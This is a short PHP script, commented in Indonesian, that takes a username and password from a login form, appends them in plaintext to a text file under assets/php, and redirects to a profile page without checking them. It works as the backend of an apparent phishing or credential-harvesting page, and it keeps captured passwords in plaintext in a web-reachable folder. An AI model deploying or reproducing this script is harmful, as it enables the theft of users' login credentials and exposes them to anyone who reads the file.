<?php
// Mulai sesi
session_start();

// Konfigurasi file txt untuk menyimpan data login
$file = 'assets/php/login_data.txt';

// Ambil data dari formulir
$username = $_POST['username'];
$password = $_POST['password'];

// Simpan data login ke dalam file txt
$data = "Username: $username\nPassword: $password\n\n";

// Buka file txt untuk ditambahkan (append)
$file_handle = fopen($file, 'a');
if ($file_handle === false) {
    die("Gagal membuka file untuk ditulis.");
}

// Tulis data ke dalam file
if (fwrite($file_handle, $data) === false) {
    die("Gagal menulis ke file.");
}

// Tutup file handle
fclose($file_handle);

// Alihkan ke halaman index
header("Location: profile.html");
exit();
?>
